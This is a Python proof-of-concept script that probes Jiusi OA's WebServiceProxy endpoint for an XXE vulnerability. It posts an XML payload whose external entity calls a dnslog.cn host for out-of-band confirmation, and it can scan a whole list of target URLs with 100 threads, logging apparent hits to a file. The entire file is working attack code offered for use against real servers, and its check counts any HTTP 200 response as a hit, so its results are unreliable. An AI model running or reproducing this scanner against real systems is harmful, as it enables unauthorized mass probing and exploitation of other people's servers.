import sys,argparse,requests,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    test = """九思OA接口WebServiceProxy存在XXE漏洞"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="九思OA接口WebServiceProxy存在XXE漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/jsoa/WebServiceProxy"
    headers = {
        "User-Agent": "Mozilla/5.0(Windows NT 10.0;Win64;x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/126.0.0.0Safari/537.36",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close"
    }
    data ='<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://11111.edbxqa.dnslog.cn"> %remote;]>'
    try:
        res = requests.get(url=target)
        if res.status_code == 200:
            res1 = requests.post(url=target+payload, headers=headers,data=data,verify=False,timeout=5)
            if res1.status_code == 200:
                print(f"[+]{target} 存在漏洞")
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write(f"[+]{target} 存在漏洞，其内容为:{res1.text}")
            else:
                print(f"[-] {target} 不存在漏洞")
        else:
            print(f"{target}可能有问题，请手工查看")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()